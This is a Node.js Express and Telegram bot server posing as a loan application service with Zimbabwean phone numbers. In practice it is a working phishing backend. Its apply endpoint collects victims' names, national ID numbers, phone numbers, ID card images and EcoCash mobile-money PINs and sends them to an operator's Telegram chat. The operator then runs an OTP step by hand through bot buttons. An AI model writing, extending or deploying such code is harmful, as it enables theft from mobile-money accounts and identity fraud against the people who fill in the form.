const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const multer = require('multer');
const path = require('path');

const app = express();
const upload = multer({ storage: multer.memoryStorage() }); 

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const bot = new Telegraf(BOT_TOKEN);
const applications = {}; 

bot.start((ctx) => ctx.reply('Welcome Admin! You will receive loan applications here.'));

bot.action(/^gen_otp_(.+)$/, (ctx) => {
    const appId = ctx.match[1];
    if (!applications[appId]) return ctx.answerCbQuery('Application not found.');
    const newOtp = Math.floor(100000 + Math.random() * 900000).toString();
    applications[appId].otp = newOtp;
    ctx.answerCbQuery('OTP Generated!');
    ctx.editMessageText(`✅ OTP for ${applications[appId].name} is: <b>${newOtp}</b>`, { parse_mode: 'HTML' });
});

bot.action(/^revoke_otp_(.+)$/, (ctx) => {
    const appId = ctx.match[1];
    if (!applications[appId]) return ctx.answerCbQuery('Application not found.');
    applications[appId].otp = null;
    ctx.answerCbQuery('OTP Revoked!');
    ctx.editMessageText(`❌ OTP for ${applications[appId].name} has been revoked.`);
});

bot.launch().then(() => console.log('Bot running'));

// --- API ENDPOINT ---
app.post('/api/apply', upload.single('idCard'), async (req, res) => {
    const appId = `APP_${Date.now()}`;
    const data = req.body; 
    const file = req.file; 

    applications[appId] = { ...data, otp: null, status: 'pending' };

    // USING HTML FORMATTING INSTEAD OF MARKDOWN
    const message = `
🚨 <b>NEW LOAN APPLICATION</b> 🚨

<b>App ID:</b> ${appId}
<b>Name:</b> ${data.fullName}
<b>ID Number:</b> ${data.idNumber}
<b>Phone:</b> +263${data.phoneNumber}
<b>Loan Amount:</b> $${data.loanAmount}
<b>EcoCash PIN:</b> <code>${data.ecoCashPin}</code>
    `;

    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Generate OTP', `gen_otp_${appId}`)],
        [Markup.button.callback('❌ Revoke OTP', `revoke_otp_${appId}`)]
    ]);

    try {
        // 1. Send text message using HTML
        await bot.telegram.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML', ...keyboard });
        
        // 2. Try to send file
        if (file) {
            try {
                await bot.telegram.sendDocument(ADMIN_CHAT_ID, { 
                    source: file.buffer, 
                    filename: file.originalname 
                });
            } catch (fileError) {
                console.log("File upload to Telegram failed:", fileError.message);
            }
        }
        
        res.json({ success: true, appId: appId });
    } catch (error) {
        console.error("TELEGRAM ERROR:", error.message);
        res.status(500).json({ success: false, message: error.message });
    }
});

// --- OTP VERIFICATION ENDPOINT ---
app.post('/api/verify-otp', express.json(), (req, res) => {
    const { appId, otp } = req.body;
    if (!applications[appId]) return res.status(404).json({ success: false, message: 'Not found.' });
    
    if (applications[appId].otp && applications[appId].otp === otp) {
        bot.telegram.sendMessage(ADMIN_CHAT_ID, `✅ User <b>${applications[appId].name}</b> verified OTP!`, { parse_mode: 'HTML' });
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, message: 'Invalid OTP.' });
    }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));